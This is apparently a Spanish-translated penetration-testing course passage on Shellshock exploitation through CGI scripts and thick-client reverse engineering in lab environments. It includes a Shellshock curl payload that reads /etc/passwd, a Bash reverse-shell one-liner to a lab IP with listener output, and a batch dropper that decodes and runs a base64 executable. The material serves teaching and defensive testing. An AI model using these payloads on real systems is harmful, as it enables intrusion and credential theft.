A [Interfaz de Puerta de Enlace Común (CGI)](https://www.w3.org/CGI/) se utiliza para ayudar a un servidor web a renderizar páginas dinámicas y crear una respuesta personalizada para el usuario que realiza una solicitud a través de una aplicación web. Las aplicaciones CGI se utilizan principalmente para acceder a otras aplicaciones que se ejecutan en un servidor web. CGI es esencialmente middleware entre servidores web, bases de datos externas y fuentes de información. Los scripts y programas CGI se mantienen en el `/CGI-bin` directorio en un servidor web y se puede escribir en C, C++, Java, PERL, etc. Los scripts CGI se ejecutan en el contexto de seguridad del servidor web. A menudo se utilizan para libros de visitas, formularios (como correo electrónico, comentarios, registro), listas de correo, blogs, etc. Estos scripts son independientes del lenguaje y se pueden escribir de manera muy simple para realizar tareas avanzadas mucho más fácil que escribirlos utilizando lenguajes de programación del lado del servidor.

Los scripts/aplicaciones CGI se usan típicamente por algunas razones:

- Si el servidor web debe interactuar dinámicamente con el usuario
- Cuando un usuario envía datos al servidor web completando un formulario. La aplicación CGI procesaría los datos y devolvería el resultado al usuario a través del servidor web

A continuación se puede ver una representación gráfica de cómo funciona CGI.

![imagen](https://academy.hackthebox.com/storage/modules/113/cgi.gif)

[Fuente gráfica](https://www.tcl.tk/man/aolserver3.0/cgi.gif)

En términos generales, los pasos son los siguientes:

- Se crea un directorio en el servidor web que contiene los scripts/aplicaciones CGI. Este directorio se llama típicamente `CGI-bin`.
- El usuario de la aplicación web envía una solicitud al servidor a través de una URL, es decir, https://acme.com/cgi-bin/newchiscript.pl
- El servidor ejecuta el script y pasa la salida resultante de nuevo al cliente web

Hay algunas desventajas de usarlos: El programa CGI inicia un nuevo proceso para cada solicitud HTTP que puede ocupar una gran cantidad de memoria del servidor. Cada vez se abre una nueva conexión de base de datos. Los datos no se pueden almacenar en caché entre cargas de página, lo que reduce la eficiencia. Sin embargo, los riesgos y las ineficiencias superan los beneficios, y CGI no se ha mantenido al día con los tiempos y no ha evolucionado para funcionar bien con las aplicaciones web modernas. Ha sido reemplazado por tecnologías más rápidas y seguras. Sin embargo, como probadores, nos encontraremos con aplicaciones web de vez en cuando que aún usan CGI y, a menudo, las veremos cuando nos encontremos con dispositivos integrados durante una evaluación.

---

## Ataques CGI

Quizás el ataque CGI más conocido es explotar la vulnerabilidad Shellshock (también conocida como "Bash bug") a través de CGI. La vulnerabilidad de Shellshock ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) fue descubierto en 2014, es relativamente simple de explotar, y todavía se puede encontrar en la naturaleza (durante las pruebas de penetración) de vez en cuando. Es una falla de seguridad en el shell de Bash (GNU Bash hasta la versión 4.3) que se puede usar para ejecutar comandos no intencionales utilizando variables de entorno. En el momento del descubrimiento, era un error de 25 años y una amenaza significativa para las empresas de todo el mundo.

---

## Shellshock vía CGI

La vulnerabilidad Shellshock permite a un atacante explotar versiones antiguas de Bash que guardan variables de entorno incorrectamente. Por lo general, al guardar una función como variable, la función de shell se detendrá donde el creador la define para que finalice. Las versiones vulnerables de Bash permitirán a un atacante ejecutar comandos del sistema operativo que se incluyen después de una función almacenada dentro de una variable de entorno. Veamos un ejemplo simple en el que definimos una variable de entorno e incluimos un comando malicioso después.

  Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

```shell-session
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

Cuando se asigna la variable anterior, Bash interpretará el `y='() { :;};'` porción como definición de función para una variable `y`. La función no hace más que devolver un código de salida `0`, pero cuando se importa, ejecutará el comando `echo vulnerable-shellshock` si la versión de Bash es vulnerable. Este (o cualquier otro comando, como un shell inverso de una sola línea) se ejecutará en el contexto del usuario del servidor web. La mayoría de las veces, este será un usuario como `www-data`y tendremos acceso al sistema, pero aún necesitamos escalar los privilegios. Ocasionalmente tendremos mucha suerte y obtendremos acceso como `root` usuario si el servidor web se está ejecutando en un contexto elevado.

Si el sistema no es vulnerable, solo `"not vulnerable"` se imprimirá.

  Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

```shell-session
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

not vulnerable
```

Este comportamiento ya no ocurre en un sistema parcheado, ya que Bash no ejecutará código después de importar una definición de función. Además, Bash ya no interpretará `y=() {...}` como definición de función. Pero más bien, las definiciones de funciones dentro de las variables de entorno ahora deben tener un prefijo `BASH_FUNC_`.

---

## Ejemplo Práctico

Veamos un ejemplo práctico para ver cómo nosotros, como pentesters, podemos encontrar y explotar este defecto.

#### Enumeración - Gobuster

Podemos buscar scripts CGI utilizando una herramienta como `Gobuster`. Aquí encontramos uno, `access.cgi`.

  Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

```shell-session
vcrdcr@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              cgi
[+] Timeout:                 10s
===============================================================
2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
===============================================================
/access.cgi           (Status: 200) [Size: 0]
                                             
===============================================================
2023/03/23 09:26:29 Finished

```

A continuación, podemos descifrar el guión y notar que no se nos emite nada, por lo que tal vez sea un guión difunto, pero aún así vale la pena explorar más.

  Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

```shell-session
vcrdcr@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi

HTTP/1.1 200 OK
Date: Thu, 23 Mar 2023 13:28:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html
```

#### Confirmando la Vulnerabilidad

Para verificar la vulnerabilidad, podemos usar un simple `cURL` comanda o usa Burp Suite Repeater o Intruder para borrar el campo de agente de usuario. Aquí podemos ver que el contenido de la `/etc/passwd` el archivo se nos devuelve, confirmando así la vulnerabilidad a través del campo user-agent.

  Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

```shell-session
vcrdcr@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```

#### Explotación para Revertir el Acceso a Shell

Una vez que se ha confirmado la vulnerabilidad, podemos obtener acceso de shell inverso de muchas maneras. En este ejemplo, usamos un simple Bash de una línea y recibimos una devolución de llamada en nuestro oyente Netcat.

  Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

```shell-session
vcrdcr@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

A partir de aquí, podríamos comenzar a buscar datos confidenciales o intentar escalar privilegios. Durante una prueba de penetración de red, podríamos intentar usar este host para pivotar más en la red interna.

  Atacar aplicaciones de Interfaz de Puerta de Enlace Común (CGI) - Shellshock

```shell-session
vcrdcr@htb[/htb]$ sudo nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
www-data@htb:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htb:/usr/lib/cgi-bin$
```

---

## Mitigación

Esto [entrada de blog](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability)contiene consejos útiles para mitigar la vulnerabilidad de Shellshock. La forma más rápida de remediar la vulnerabilidad es actualizar la versión de Bash en el sistema afectado. Esto puede ser más complicado en los sistemas Ubuntu/Debian al final de su vida útil, por lo que un administrador de sistemas puede tener primero que actualizar el administrador de paquetes. Con ciertos sistemas (es decir, dispositivos IoT que usan CGI), la actualización puede no ser posible. En estos casos, sería mejor primero asegurarse de que el sistema no esté expuesto a Internet y luego evaluar si el host puede ser dado de baja. Si se trata de un host crítico y la organización decide aceptar el riesgo, una solución temporal podría ser el firewall del host en la red interna lo mejor posible. Tenga en cuenta que esto es simplemente poner una venda en una herida grande, y el mejor curso de acción sería actualizar o desconectar al host.

---

## Pensamientos Cerradores

Shellshock es una vulnerabilidad heredada que ahora tiene casi una década. Pero solo por su edad, eso no significa que no nos encontremos con él ocasionalmente. Si se encuentra con alguna aplicación web que use scripts CGI durante sus evaluaciones (especialmente dispositivos IoT), definitivamente vale la pena profundizar en el uso de los pasos que se muestran en esta sección. ¡Puede tener un punto de apoyo relativamente simple esperándote!


# Atacar Aplicaciones Gruesas de Clientes

---

Las aplicaciones cliente gruesas son las aplicaciones que se instalan localmente en nuestros ordenadores. A diferencia de las aplicaciones de cliente ligero que se ejecutan en un servidor remoto y se puede acceder a través del navegador web, estas aplicaciones no requieren acceso a Internet para ejecutarse, y funcionan mejor en potencia de procesamiento, memoria y capacidad de almacenamiento. Las aplicaciones cliente gruesas suelen ser aplicaciones utilizadas en entornos empresariales creados para fines específicos. Dichas aplicaciones incluyen sistemas de gestión de proyectos, sistemas de gestión de relaciones con clientes, herramientas de gestión de inventario y otro software de productividad. Estas aplicaciones generalmente se desarrollan usando Java, C++, .NET o Microsoft Silverlight.

Una medida de seguridad crítica que, por ejemplo `Java` has es una tecnología llamada `sandbox`. El sandbox es un entorno virtual que permite que el código no confiable, como el código descargado de Internet, se ejecute de forma segura en el sistema de un usuario sin representar un riesgo de seguridad. Además, aísla el código no confiable, evitando que acceda o modifique los recursos del sistema y otras aplicaciones sin la debida autorización. Además de eso, también hay `Java API restrictions` y `Code Signing` eso ayuda a crear un entorno más seguro.

En a `.NET` medio ambiente, a `thick client`, también conocido como a `rich` cliente o `fat` cliente, se refiere a una aplicación que realiza una cantidad significativa de procesamiento en el lado del cliente en lugar de confiar únicamente en el servidor para todas las tareas de procesamiento. Como resultado, los clientes gruesos pueden proporcionar un mejor rendimiento, más características y mejores experiencias de usuario en comparación con sus `thin client` contrapartes, que dependen en gran medida del servidor para el procesamiento y almacenamiento de datos.

Algunos ejemplos de aplicaciones cliente gruesas son navegadores web, reproductores multimedia, software de chat y videojuegos. Algunas aplicaciones cliente gruesas suelen estar disponibles para comprar o descargar de forma gratuita a través de su sitio web oficial o tiendas de aplicaciones de terceros, mientras que otras aplicaciones personalizadas que se han creado para una empresa específica, se pueden entregar directamente desde el departamento de TI que ha desarrollado el software. Implementar y mantener aplicaciones cliente gruesas puede ser más difícil que las aplicaciones cliente delgadas, ya que los parches y las actualizaciones deben realizarse localmente en la computadora del usuario. Algunas características de las aplicaciones de cliente grueso son:

- Software independiente.
- Trabajar sin acceso a internet.
- Almacenamiento de datos localmente.
- Menos seguro.
- Consumir más recursos.
- Más caro.

Las aplicaciones cliente gruesas se pueden clasificar en arquitectura de dos y tres niveles. En la arquitectura de dos niveles, la aplicación se instala localmente en la computadora y se comunica directamente con la base de datos. En la arquitectura de tres niveles, las aplicaciones también se instalan localmente en la computadora, pero para interactuar con las bases de datos, primero se comunican con un servidor de aplicaciones, generalmente utilizando el protocolo HTTP/HTTPS. En este caso, el servidor de aplicaciones y la base de datos pueden estar ubicados en la misma red o a través de Internet. Esto es algo que hace que la arquitectura de tres niveles sea más segura ya que los atacantes no podrán comunicarse directamente con la base de datos. La imagen a continuación muestra las diferencias entre las aplicaciones de arquitectura de dos niveles y tres niveles.

![arch_tiers](https://academy.hackthebox.com/storage/modules/113/thick_clients/arch_tiers.png)

Dado que una gran parte de las aplicaciones cliente gruesas se descargan de Internet, no hay forma suficiente de garantizar que los usuarios descarguen la aplicación oficial, y eso plantea problemas de seguridad. Las vulnerabilidades específicas de la web como XSS, CSRF y Clickjacking no se aplican a las aplicaciones cliente gruesas. Sin embargo, las aplicaciones cliente gruesas se consideran menos seguras que las aplicaciones web con muchos ataques aplicables, incluyendo:

- Manejo Inadecuado de Errores.
- Datos sensibles codificados.
- secuestro de DLL.
- Desbordamiento de Buffer.
- Inyección SQL.
- Almacenamiento Inseguro.
- Gestión de Sesiones.

---

## Pasos de Prueba de Penetración

Las aplicaciones de cliente grueso se consideran más complejas que otras, y la superficie de ataque puede ser grande. Las pruebas gruesas de penetración de aplicaciones de clientes se pueden realizar tanto utilizando herramientas automatizadas como manualmente. Los siguientes pasos generalmente se siguen al probar aplicaciones de cliente gruesas.

#### Recopilación de Información

In this step, penetration testers have to identify the application architecture, the programming languages and frameworks that have been used, and understand how the application and the infrastructure work. They should also need to identify technologies that are used on the client and server sides and find entry points and user inputs. Testers should also look for identifying common vulnerabilities like the ones we mentioned earlier at the end of the [About](https://academy.hackthebox.com/module/113/section/2139##About) section. The following tools will help us gather information.

|||||
|---|---|---|---|
|[CFF Explorer](https://ntcore.com/?page_id=388)|[Detect It Easy](https://github.com/horsicq/Detect-It-Easy)|[Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)|[Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)|

#### Client Side attacks

Aunque los clientes gruesos realizan un procesamiento y almacenamiento de datos significativos en el lado del cliente, aún se comunican con los servidores para diversas tareas, como la sincronización de datos o el acceso a recursos compartidos. Esta interacción con servidores y otros sistemas externos puede exponer a clientes gruesos a vulnerabilidades similares a las que se encuentran en las aplicaciones web, incluida la inyección de comandos, el control de acceso débil y la inyección SQL.

La información confidencial, como nombres de usuario y contraseñas, tokens o cadenas para la comunicación con otros servicios, puede almacenarse en los archivos locales de la aplicación. Las credenciales codificadas y otra información confidencial también se pueden encontrar en el código fuente de la aplicación, por lo que el Análisis Estático es un paso necesario al probar la aplicación. Usando las herramientas adecuadas, podemos realizar ingeniería inversa y examinar .Aplicaciones NET y Java, incluyendo EXE, DLL, JAR, CLASS, WAR y otros formatos de archivo. El análisis dinámico también debe realizarse en este paso, ya que las aplicaciones cliente gruesas también almacenan información confidencial en la memoria.

|||||
|---|---|---|---|
|[Ghidra](https://www.ghidra-sre.org/)|[AIF](https://hex-rays.com/ida-pro/)|[OllyDbg](http://www.ollydbg.de/)|[Radare2](https://www.radare.org/r/index.html)|
|[dnspy](https://github.com/dnSpy/dnSpy)|[x64dbg](https://x64dbg.com/)|[JADX](https://github.com/skylot/jadx)|[Frida](https://frida.re/)|

#### Ataques Laterales de Red

Si la aplicación se comunica con un servidor local o remoto, el análisis de tráfico de red nos ayudará a capturar información confidencial que podría transferirse a través de la conexión HTTP/HTTPS o TCP/UDP, y nos dará una mejor comprensión de cómo funciona esa aplicación. Los probadores de penetración que realizan análisis de tráfico en aplicaciones de clientes gruesas deben estar familiarizados con herramientas como:

|||||
|---|---|---|---|
|[Alambre](https://www.wireshark.org/)|[tcpdump](https://www.tcpdump.org/)|[TCPVista](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview)|[Suite Burp](https://portswigger.net/burp)|

#### Ataques del Lado del Servidor

Los ataques del lado del servidor en aplicaciones cliente gruesas son similares a los ataques de aplicaciones web, y los probadores de penetración deben prestar atención a los más comunes, incluida la mayoría de los Diez Mejores de OWASP.

---

## Recuperar Credenciales codificadas de Aplicaciones de Cliente Grueso

El siguiente escenario nos guía a través de la enumeración y explotación de una aplicación de cliente grueso, con el fin de moverse lateralmente dentro de una red corporativa durante las pruebas de penetración. El escenario comienza después de que hayamos obtenido acceso a un servicio SMB expuesto.

Explorando el `NETLOGON` parte del servicio SMB revela `RestartOracle-Service.exe` entre otros archivos. Al descargar el ejecutable localmente y ejecutarlo a través de la línea de comandos, parece que no se ejecuta o ejecuta algo oculto.

  Atacar Aplicaciones Gruesas de Clientes

```cmd-session
C:\Apps>.\Restart-OracleService.exe
C:\Apps>
```

Descargando la herramienta `ProcMon64` de [SysInternos](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) y monitorear el proceso revela que el ejecutable realmente crea un archivo temporal en `C:\Users\Matt\AppData\Local\Temp`.

![procmon](https://academy.hackthebox.com/storage/modules/113/thick_clients/procmon.png)

Para capturar los archivos, se requiere cambiar los permisos de la `Temp` carpeta para no permitir la eliminación de archivos. Para hacer esto, hacemos clic derecho en la carpeta `C:\Users\Matt\AppData\Local\Temp` y debajo `Properties` -> `Security` -> `Advanced` -> `cybervaca` -> `Disable inheritance` -> `Convert inherited permissions into explicit permissions on this object` -> `Edit` -> `Show advanced permissions`, anulamos la selección del `Delete subfolders and files`, y `Delete` casillas de verificación.

![permas de cambio](https://academy.hackthebox.com/storage/modules/113/thick_clients/change-perms.png)

Finalmente, hacemos clic `OK` -> `Apply` -> `OK` -> `OK` en las ventanas abiertas. Una vez que se han aplicado los permisos de carpeta, simplemente ejecutamos nuevamente el `Restart-OracleService.exe` y comprueba el `temp` carpeta. El archivo `6F39.bat` se crea bajo el `C:\Users\cybervaca\AppData\Local\Temp\2`. Los nombres de los archivos generados son aleatorios cada vez que se ejecuta el servicio.

  Atacar Aplicaciones Gruesas de Clientes

```cmd-session
C:\Apps>dir C:\Users\cybervaca\AppData\Local\Temp\2

...SNIP...
04/03/2023  02:09 PM         1,730,212 6F39.bat
04/03/2023  02:09 PM                 0 6F39.tmp
```

Listando el contenido de la `6F39` el archivo por lotes revela lo siguiente.

Código: lote

```batch
@shift /0
@echo off

if %username% == matt goto correcto
if %username% == frankytech goto correcto
if %username% == ev4si0n goto correcto
goto error

:correcto
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<SNIP>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
powershell.exe -exec bypass -file c:\programdata\monta.ps1
del c:\programdata\monta.ps1
del c:\programdata\oracle.txt
c:\programdata\restart-service.exe
del c:\programdata\restart-service.exe
```

Inspeccionar el contenido del archivo revela que el archivo por lotes está eliminando dos archivos y se eliminan antes de que alguien pueda acceder a las sobras. Podemos intentar recuperar el contenido de los 2 archivos, modificando el script por lotes y eliminando la eliminación.

Código: lote

```batch
@shift /0
@echo off

echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
<SNIP>
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
```

Después de ejecutar el script por lotes haciendo doble clic en él, esperamos unos minutos para detectar el `oracle.txt` archivo que contiene otro archivo lleno de líneas base64 y el script `monta.ps1` que contiene el siguiente contenido, en el directorio `c:\programdata\`. Listado del contenido del archivo `monta.ps1` revela el siguiente código.

  Atacar Aplicaciones Gruesas de Clientes

```powershell-session
C:\>  cat C:\programdata\monta.ps1

$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
```

Este script simplemente lee el contenido de la `oracle.txt` archivar y decodificarlo a la `restart-service.exe` ejecutable. Ejecutar este script nos da un ejecutable final que podemos analizar más a fondo.

  Atacar Aplicaciones Gruesas de Clientes

```powershell-session
C:\>  ls C:\programdata\

Mode                LastWriteTime         Length Name
<SNIP>
-a----        3/24/2023   1:01 PM            273 monta.ps1
-a----        3/24/2023   1:01 PM         601066 oracle.txt
-a----        3/24/2023   1:17 PM         432273 restart-service.exe
```

Ahora al ejecutar `restart-service.exe` se nos presenta el banner `Restart Oracle` creado por `HelpDesk` en 2010.

  Atacar Aplicaciones Gruesas de Clientes

```powershell-session
C:\>  .\restart-service.exe

    ____            __             __     ____                  __
   / __ \___  _____/ /_____ ______/ /_   / __ \_________ ______/ /__
  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / / / / ___/ __ `/ ___/ / _ \
 / _, _/  __(__  ) /_/ /_/ / /  / /_   / /_/ / /  / /_/ / /__/ /  __/
/_/ |_|\___/____/\__/\__,_/_/   \__/   \____/_/   \__,_/\___/_/\___/

                                                by @HelpDesk 2010


PS C:\ProgramData>
```

Inspeccionar la ejecución del ejecutable a través de `ProcMon64` muestra que está consultando varias cosas en el registro y no muestra nada sólido para pasar.

![proc-reinicio](https://academy.hackthebox.com/storage/modules/113/thick_clients/proc-restart.png)

Empecemos `x64dbg`, navega para `Options` -> `Preferences`y desmarque todo excepto `Exit Breakpoint`:

![texto](https://academy.hackthebox.com/storage/modules/113/Exit_Breakpoint_1.png)

Al desmarcar las otras opciones, la depuración comenzará directamente desde el punto de salida de la aplicación, y evitaremos pasar por cualquiera `dll` archivos que se cargan antes de que comience la aplicación. Entonces, podemos seleccionar `file` -> `open` y selecciona el `restart-service.exe` para importarlo e iniciar la depuración. Una vez importado, hacemos clic derecho dentro del `CPU` ver y `Follow in Memory Map`:

![gdb_banner](https://academy.hackthebox.com/storage/modules/113/Follow-In-Memory-Map.png)

Comprobando los mapas de memoria en esta etapa de la ejecución, de particular interés es el mapa con un tamaño de `0000000000003000` con un tipo de `MAP` y protección establecida para `-RW--`.

![mapas](https://academy.hackthebox.com/storage/modules/113/Identify-Memory-Map.png)

Los archivos con mapas de memoria permiten que las aplicaciones accedan a archivos grandes sin tener que leer o escribir todo el archivo en la memoria a la vez. En cambio, el archivo se asigna a una región de memoria que la aplicación puede leer y escribir como si fuera un búfer regular en la memoria. Este podría ser un lugar para buscar credenciales codificadas.

Si hacemos doble clic en él, veremos los bytes mágicos `MZ` en el `ASCII` columna que indica que el archivo es un [DOS MZ ejecutable](https://en.wikipedia.org/wiki/DOS_MZ_executable).

![magic_bytes_3](https://academy.hackthebox.com/storage/modules/113/thick_clients/magic_bytes_3.png)

Volvamos al panel Mapa de memoria, luego exporte el elemento asignado recién descubierto de la memoria a un archivo de volcado haciendo clic derecho en la dirección y seleccionando `Dump Memory to File`. Corriendo `strings` en el archivo exportado revela alguna información interesante.

  Atacar Aplicaciones Gruesas de Clientes

```powershell-session
C:\> C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin

<SNIP>
"#M
z\V
).NETFramework,Version=v4.0,Profile=Client
FrameworkDisplayName
.NET Framework 4 Client Profile
<SNIP>
```

La lectura de la salida revela que el volcado contiene un `.NET` ejecutable. Podemos usar `De4Dot` para revertir `.NET` los ejecutables vuelven al código fuente arrastrando el `restart-service_00000000001E0000.bin` en el `de4dot` ejecutable.

  Atacar Aplicaciones Gruesas de Clientes

```cmd-session
de4dot v3.1.41592.3405

Detected Unknown Obfuscator (C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin)
Cleaning C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin
Renaming all obfuscated symbols
Saving C:\Users\cybervaca\Desktop\restart-service_00000000001E0000-cleaned.bin


Press any key to exit...
```

Ahora, podemos leer el código fuente de la aplicación exportada arrastrándola y soltándola en el `DnSpy` ejecutable.

![souce-code_oculto](https://academy.hackthebox.com/storage/modules/113/thick_clients/souce-code_hidden.png)

Con el código fuente revelado, podemos entender que este binario es hecho a medida `runas.exe` con el único propósito de reiniciar el servicio Oracle utilizando credenciales codificadas.


# Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

---

Las aplicaciones cliente gruesas con una arquitectura de tres niveles tienen una ventaja de seguridad sobre las que tienen una arquitectura de dos niveles, ya que evita que el usuario final se comunique directamente con el servidor de base de datos. Sin embargo, las aplicaciones de tres niveles pueden ser susceptibles a ataques específicos de la web como SQL Injection y Path Traversal.

Durante las pruebas de penetración, es común que alguien se encuentre con una aplicación cliente gruesa que se conecta a un servidor para comunicarse con la base de datos. El siguiente escenario muestra un caso en el que el probador ha encontrado los siguientes archivos mientras enumera un servidor FTP que proporciona `anonymous` acceso de usuario.

- graso-cliente.jar
- nota.txt
- nota2.txt
- nota3.txt

Leer el contenido de todos los archivos de texto revela que:

- Un servidor ha sido reconfigurado para ejecutarse en el puerto `1337` en lugar de `8000`.
- Esta podría ser una arquitectura de cliente gruesa/delgada donde la aplicación del cliente aún necesita actualizarse para usar el nuevo puerto.
- La aplicación del cliente se basa en `Java 8`.
- Las credenciales de inicio de sesión para iniciar sesión en la aplicación cliente son `qtc / clarabibi`.

Corramos el `fatty-client.jar` archivo haciendo doble clic en él. Una vez que se inicia la aplicación, podemos iniciar sesión con las credenciales `qtc / clarabibi`.

![errar](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/err.png)

Esto no es exitoso, y el mensaje `Connection Error!` se muestra. Esto es probablemente porque el puerto que apunta a los servidores necesita ser actualizado desde `8000` a `1337`. Capturemos y analicemos el tráfico de red usando Wireshark para confirmar esto. Una vez que se inicia Wireshark, hacemos clic en `Login` una vez más.

![wireshark](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/wireshark.png)

A continuación se muestra un ejemplo sobre cómo abordar las solicitudes de DNS de las aplicaciones a su favor. Verifique el contenido del archivo C:\Windows\System32\drivers\etc\hosts donde la IP 172.16.17.114 apunta a fatty.htb y server.fatty.htb

El cliente intenta conectarse al `server.fatty.htb` subdominio. Iniciemos un símbolo del sistema como administrador y agreguemos la siguiente entrada al `hosts` archivo.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```cmd-session
C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```

Inspeccionar el tráfico nuevamente revela que el cliente está intentando conectarse al puerto `8000`.

![puerto](https://academy.hackthebox.com/storage/modules/113/thick_clients_web/port.png)

El `fatty-client.jar` es un archivo de archivo Java, y su contenido se puede extraer haciendo clic derecho sobre él y seleccionando `Extract files`.

  Explotación de Vulnerabilidades Web en Aplicaciones de Cliente Grueso

```powershell-session
C:\> ls fatty-client\

<SNIP>
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/30/2019  12:10 PM                htb
d-----       10/30/2019  12:10 PM                META-INF
d-----        4/26/2017  12:09 AM                org
------       10/30/2019  12:10 PM           1550 beans.xml
------       10/30/2019  12:10 PM           2230 exit.png
------       10/30/2019  12:10 PM           4317 fatty.p12
------       10/30/2019  12:10 PM            831 log4j.properties
------        4/26/2017  12:08 AM            299 module-info.class
------       10/30/2019  12:10 PM          41645 spring-beans-3.0.xsd
```

Ejecutemos PowerShell como administrador, naveguemos al directorio extraído y usemos el `Select-String` comando para buscar todos los archivos para el puerto `8000`.

